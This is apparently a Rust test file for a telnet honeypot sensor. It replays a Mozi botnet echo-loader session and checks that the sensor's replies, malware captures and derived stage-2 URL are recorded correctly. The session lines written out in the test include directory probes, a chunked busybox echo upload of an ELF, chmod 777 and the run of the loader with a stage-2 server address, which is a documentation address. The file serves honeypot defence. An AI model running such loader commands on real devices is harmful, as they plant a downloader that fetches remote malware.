//! Replay of a Mozi telnet echo-loader session, as observed on a production sensor, through the
//! real telnet listener: the router-CLI preamble, the writable-directory probe, the `wget` and
//! ELF-header probes, the downloader uploaded as `busybox echo -ne '\xNN...' >> .i` chunks, the
//! `chmod 777 .i || (cp ... )` line and the run of `./.i` with the stage-2 address. The addresses
//! are RFC 5737 documentation addresses and the uploaded ELF is synthetic.

use std::collections::HashMap;
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

use sensor_framework::fakefs::FakeFs;
use sensor_framework::{ConnectionBounds, WanResolver};
use sensor_wire::SensorEvent;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

/// The stage-2 server the loader names: RFC 5737 TEST-NET-2.
const STAGE2: [&str; 5] = ["198", "51", "100", "23", "3912"];
const STAGE2_URL: &str = "http://198.51.100.23:3912/Mozi.6";
const MARKER: &str = "\\x42\\x4b\\x54\\x4b\\x45\\x52";
const CHUNK: usize = 50;

fn bounds() -> ConnectionBounds {
    ConnectionBounds {
        read_timeout: Duration::from_secs(5),
        idle_timeout: Duration::from_secs(5),
        max_duration: Duration::from_secs(60),
        max_captured_bytes: 1_000_000,
        max_concurrent: 100,
    }
}

/// A small static ELF in the shape of the observed downloader: an x86-64 ELF header, every byte
/// value once (so each `\xNN` the loader can send is exercised), and the strings that matter.
fn synthetic_elf() -> Vec<u8> {
    let mut elf = b"\x7fELF\x02\x01\x01\x00".to_vec();
    elf.resize(16, 0);
    elf.extend_from_slice(&[0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00]);
    elf.resize(64, 0);
    elf.extend(0..=255u8);
    elf.extend_from_slice(
        b"/proc/self/cmdline\0Runn\0GET /Mozi.6 HTTP/1.0\r\n\r\n\0.shstrtab\0.text\0.rodata\0.bss\0",
    );
    elf
}

fn escaped(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("\\x{b:02x}")).collect()
}

/// The session's lines in order, and how many are upload chunks.
fn session_lines(elf: &[u8]) -> (Vec<String>, usize) {
    let mut lines: Vec<String> = [
        "start",
        "enable",
        "config terminal",
        "system",
        "linuxshell",
        "su",
        "shell",
        "sh",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    lines.push(format!(
        ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
         >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
         /bin/busybox echo -e '{MARKER}'"
    ));
    lines.push(format!(
        "/bin/busybox wget;/bin/busybox echo -ne '{MARKER}'"
    ));
    lines.push("/bin/busybox cat /bin/ls|head -n 1".to_string());
    lines.push("/bin/busybox hexdump -e '16/1 \"%c\"' -n 52 /bin/ls".to_string());
    let chunks: Vec<&[u8]> = elf.chunks(CHUNK).collect();
    for (index, chunk) in chunks.iter().enumerate() {
        let body = escaped(chunk);
        let line = if index == 0 {
            format!("/bin/busybox echo -ne '{body}' > .i; >.x && /bin/busybox echo -en '{MARKER}'")
        } else if index + 1 < chunks.len() {
            format!("/bin/busybox echo -ne '{body}' >> .i; >.x && /bin/busybox echo -en '{MARKER}'")
        } else {
            format!(
                "/bin/busybox echo -ne '{body}' >> .i; /bin/busybox chmod 777 .i || \
                 (cp /bin/ls .j && cat .i>.j &&rm .i && cp .j .i &&rm .j) && \
                 /bin/busybox echo -en '{MARKER}'"
            )
        };
        lines.push(line);
    }
    lines.push(format!(
        "./.i {};./Runn;/bin/busybox echo -e '\\x4d\\x4f\\x57\\x48\\x4c\\x42\\x58\\x54'",
        STAGE2.join(" ")
    ));
    (lines, chunks.len())
}

/// ONLCR and Telnet IAC escaping, the encoding every shell reply passes through.
fn on_the_wire(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    for &byte in bytes {
        if byte == b'\n' {
            out.push(b'\r');
        }
        out.push(byte);
        if byte == 0xff {
            out.push(0xff);
        }
    }
    out
}

async fn read_until(conn: &mut TcpStream, done: impl Fn(&[u8]) -> bool) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    tokio::time::timeout(Duration::from_secs(10), async {
        while !done(&buf) {
            let n = conn.read(&mut chunk).await.expect("read");
            assert!(n > 0, "connection closed early; got {buf:?}");
            buf.extend_from_slice(&chunk[..n]);
        }
    })
    .await
    .unwrap_or_else(|_| panic!("timed out; got {:?}", String::from_utf8_lossy(&buf)));
    buf
}

/// Send `line` and return the reply exactly: the typed line's echo, the command's output and the
/// next prompt.
async fn exchange(conn: &mut TcpStream, line: &str, expected_len: Option<usize>) -> Vec<u8> {
    conn.write_all(line.as_bytes()).await.unwrap();
    conn.write_all(b"\r\n").await.unwrap();
    match expected_len {
        Some(len) => read_until(conn, |buf| buf.len() >= len).await,
        None => read_until(conn, |buf| buf.ends_with(b"# ")).await,
    }
}

async fn wait_for_events(
    log_path: &Path,
    done: impl Fn(&[SensorEvent]) -> bool,
) -> Vec<SensorEvent> {
    let deadline = std::time::Instant::now() + Duration::from_secs(15);
    loop {
        let events: Vec<SensorEvent> = tokio::fs::read_to_string(log_path)
            .await
            .unwrap_or_default()
            .lines()
            .filter_map(|l| serde_json::from_str(l).ok())
            .collect();
        if done(&events) {
            return events;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "timed out waiting for events in {log_path:?}: {events:?}"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

/// Run one whole session on a new connection and check every reply byte for byte.
async fn replay(addr: std::net::SocketAddr, elf: &[u8]) -> usize {
    let (lines, chunks) = session_lines(elf);
    let ls = FakeFs::new();
    let ls_header = ls.read_range("/bin/ls", 0, 52).unwrap();
    let ls_image = ls.read_range("/bin/ls", 0, 1 << 20).unwrap();
    let first_line_end = ls_image.iter().position(|&b| b == b'\n').unwrap() + 1;
    let ls_first_line = &ls_image[..first_line_end];

    let mut conn = TcpStream::connect(addr).await.unwrap();
    read_until(&mut conn, |b| b.ends_with(b"login: ")).await;
    conn.write_all(b"admin\r\n").await.unwrap();
    read_until(&mut conn, |b| b.ends_with(b"Password: ")).await;
    conn.write_all(b"admin\r\n").await.unwrap();
    read_until(&mut conn, |b| b.ends_with(b"# ")).await;

    // The router-CLI preamble ends in dash, whose prompt is a bare `# `.
    for line in &lines[..8] {
        exchange(&mut conn, line, None).await;
    }
    let mut dash_line = 0;
    for (index, line) in lines[8..].iter().enumerate() {
        dash_line += 1;
        let output: Vec<u8> = match index {
            0 => b"BKTKER\n".to_vec(),
            1 => {
                let mut usage = b"BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3.1) multi-call binary.\n\n\
                    Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]\n\
                    \t[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]\n\
                    \t[-S|--server-response] [-U|--user-agent AGENT] URL...\n\n\
                    Retrieve files via HTTP or FTP\n\n\
                    \t--spider\tOnly check URL existence: $? is 0 if exists\n\
                    \t-c\t\tContinue retrieval of aborted transfer\n\
                    \t-q\t\tQuiet\n\
                    \t-P DIR\t\tSave to DIR (default .)\n\
                    \t-S    \t\tShow server response\n\
                    \t-O FILE\t\tSave to FILE ('-' for stdout)\n\
                    \t-U STR\t\tUse STR for User-Agent header\n\
                    \t-Y on/off\tUse proxy\n"
                    .to_vec();
                usage.extend_from_slice(b"BKTKER");
                usage
            }
            2 => ls_first_line.to_vec(),
            3 => ls_header.clone(),
            i if i < 4 + chunks => b"BKTKER".to_vec(),
            _ => format!("sh: {dash_line}: ./Runn: not found\nMOWHLBXT\n").into_bytes(),
        };
        let mut expected = line.as_bytes().to_vec();
        expected.extend_from_slice(b"\r\n");
        expected.extend_from_slice(&on_the_wire(&output));
        expected.extend_from_slice(b"# ");
        let reply = exchange(&mut conn, line, Some(expected.len())).await;
        assert_eq!(
            String::from_utf8_lossy(&reply),
            String::from_utf8_lossy(&expected),
            "reply to line {index} after `sh`: {line}"
        );
        assert_eq!(reply, expected, "reply bytes to line {index} after `sh`");
    }
    // The loader hangs up after its run marker.
    drop(conn);
    chunks
}

#[tokio::test]
async fn a_mozi_echo_loader_session_is_answered_exactly_and_its_upload_captured_once() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();
    let elf = synthetic_elf();
    let chunks = replay(addr, &elf).await;
    assert!(chunks >= 8, "the synthetic upload spans several chunks");

    let uploads = |events: &[SensorEvent]| {
        events
            .iter()
            .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD)
            .cloned()
            .collect::<Vec<_>>()
    };
    let events = wait_for_events(&log_path, |events| uploads(events).len() == 1).await;
    let upload = uploads(&events).remove(0);
    let meta = &upload.metadata;
    assert_eq!(meta["capture_reason"], "echo_loader");
    assert_eq!(meta["chunk_count"], chunks);
    assert_eq!(meta["destination"], "/var/.i");
    assert_eq!(meta["orig_name"], ".i");
    assert_eq!(meta["complete"], true);
    assert_eq!(meta["end_reason"], "transfer_complete");
    assert_eq!(meta["size"], elf.len());
    assert_eq!(meta["truncated"], false);
    // The spool stores a body under the SHA-256 it verifies on read: this body is the ELF.
    let sha256 = upload.sample.as_ref().unwrap().sha256.clone();
    let stored = sensor_framework::spool::read_verified(&spool_dir, &sha256, 1 << 20).unwrap();
    assert_eq!(
        stored, elf,
        "the capture is the uploaded ELF, byte for byte"
    );

    // Each chunk's command event names the file it builds and its place in it.
    let chunk_events: Vec<&SensorEvent> = events
        .iter()
        .filter(|e| e.metadata.get("assembled_file").is_some())
        .collect();
    assert_eq!(chunk_events.len(), chunks);
    for (index, event) in chunk_events.iter().enumerate() {
        assert_eq!(event.signal_type, sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC);
        assert_eq!(event.metadata["assembled_file"], "/var/.i");
        assert_eq!(event.metadata["chunk_index"], index + 1);
    }

    // Running the downloader yields the URL it would fetch, as data for the vetted fetcher.
    let downloads: Vec<&SensorEvent> = events
        .iter()
        .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .collect();
    assert_eq!(downloads.len(), 1, "{downloads:?}");
    assert_eq!(downloads[0].metadata["url"], STAGE2_URL);
    assert_eq!(downloads[0].metadata["derived_from"], "echo_loader_args");
    assert_eq!(downloads[0].metadata["derived_sha256"], sha256.as_str());

    // The loader comes back minutes later: the same bytes are the same sample, one body on disk.
    replay(addr, &elf).await;
    let events = wait_for_events(&log_path, |events| uploads(events).len() == 2).await;
    let shas: Vec<String> = uploads(&events)
        .iter()
        .map(|e| e.sample.as_ref().unwrap().sha256.clone())
        .collect();
    assert_eq!(shas, vec![sha256.clone(), sha256.clone()]);
    let bodies = std::fs::read_dir(&spool_dir)
        .unwrap()
        .flatten()
        .filter(|e| {
            sensor_framework::spool::is_canonical_sha256_hex(&e.file_name().to_string_lossy())
        })
        .count();
    assert_eq!(bodies, 1);
    handle.abort();
}

/// The loader looping from one address, as it did live: past the source's command-event budget
/// every reply is still exact (`replay` checks each byte), every login, connection, capture and
/// derived download keeps its own event, each distinct command is logged at least once, and the
/// suppressed command events come back as one summary when the sensor shuts down.
#[tokio::test]
async fn a_looping_loader_past_its_command_budget_is_summarized_not_silenced() {
    use sensor_framework::rate_limit::Rate;
    use sensor_framework::{
        Arrival, CaptureMemoryBudget, CommandEventConfig, CommandEventGate,
        DEFAULT_CAPTURE_BUDGET_BYTES_256M, EventEmitter,
    };
    use sensor_wire::{
        SIGNAL_HONEYPOT_COMMAND_EXEC, SIGNAL_HONEYPOT_CONNECTION, SIGNAL_HONEYPOT_FILE_DOWNLOAD,
        SIGNAL_HONEYPOT_LOGIN_ATTEMPT, SIGNAL_HONEYPOT_MALWARE_UPLOAD,
    };
    use std::num::NonZeroU32;

    const SESSIONS: usize = 5;
    const BURST: u32 = 30;
    const RATE: u32 = 1;
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let gate = Arc::new(CommandEventGate::new(CommandEventConfig {
        rate: Rate::new(
            NonZeroU32::new(RATE).unwrap(),
            NonZeroU32::new(BURST).unwrap(),
        ),
        ..CommandEventConfig::default()
    }));
    let started = std::time::Instant::now();
    let (addr, handle, _handoff) = sensor_telnet::start_test_server_with_handoff(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
        Arc::new(CaptureMemoryBudget::new(DEFAULT_CAPTURE_BUDGET_BYTES_256M)),
        gate.clone(),
        Arc::new(sensor_telnet::infected_hold::InfectedHold::disabled()),
    )
    .await
    .unwrap();
    let elf = synthetic_elf();
    let (lines, chunks) = session_lines(&elf);
    for _ in 0..SESSIONS {
        replay(addr, &elf).await;
    }
    let of = |events: &[SensorEvent], signal: &str| {
        events
            .iter()
            .filter(|e| e.signal_type == signal)
            .cloned()
            .collect::<Vec<_>>()
    };
    wait_for_events(&log_path, |events| {
        of(events, SIGNAL_HONEYPOT_MALWARE_UPLOAD).len() == SESSIONS
    })
    .await;
    let elapsed = started.elapsed().as_secs() + 1;
    handle.abort();
    gate.flush(
        &EventEmitter::new(log_path.clone()),
        Arrival::new(addr.port()),
    )
    .await;
    let events = wait_for_events(&log_path, |events| {
        events
            .iter()
            .any(|e| e.metadata.get("command_summary").is_some())
    })
    .await;

    // Nothing that is not a plain command event lost its own.
    assert_eq!(of(&events, SIGNAL_HONEYPOT_CONNECTION).len(), SESSIONS);
    assert_eq!(of(&events, SIGNAL_HONEYPOT_LOGIN_ATTEMPT).len(), SESSIONS);
    assert_eq!(of(&events, SIGNAL_HONEYPOT_MALWARE_UPLOAD).len(), SESSIONS);
    let downloads = of(&events, SIGNAL_HONEYPOT_FILE_DOWNLOAD);
    assert_eq!(downloads.len(), SESSIONS, "every derived URL");
    assert!(downloads.iter().all(|e| e.metadata["url"] == STAGE2_URL));

    let commands = of(&events, SIGNAL_HONEYPOT_COMMAND_EXEC);
    let (summaries, individual): (Vec<_>, Vec<_>) = commands
        .iter()
        .partition(|e| e.metadata.get("command_summary").is_some());
    let total = lines.len() * SESSIONS;
    assert_eq!(summaries.len(), 1, "one window, one summary");
    let summary = &summaries[0].metadata;
    assert_eq!(
        individual.len() as u64 + summary["suppressed_count"].as_u64().unwrap(),
        total as u64,
        "every command is either its own event or counted in the summary"
    );
    assert!(
        individual.len() as u64
            <= u64::from(BURST) + u64::from(RATE) * elapsed + lines.len() as u64,
        "{} individual command events in {elapsed} s",
        individual.len()
    );
    assert!(individual.len() < total, "the budget suppressed something");
    for line in &lines {
        assert!(
            individual
                .iter()
                .any(|e| e.metadata["command"] == line.as_str()),
            "a distinct command is logged at least once: {line}"
        );
    }
    assert_eq!(summary["source_prefix"], "127.0.0.0/24");
    assert_eq!(summary["assembled_file"], "/var/.i");
    assert_eq!(summary["max_chunk_index"], chunks);
    assert!(summary["session_count"].as_u64().unwrap() >= 1);
    assert_eq!(summaries[0].sensor, "telnet");
    assert_eq!(summaries[0].metadata["local_port"], addr.port());
}
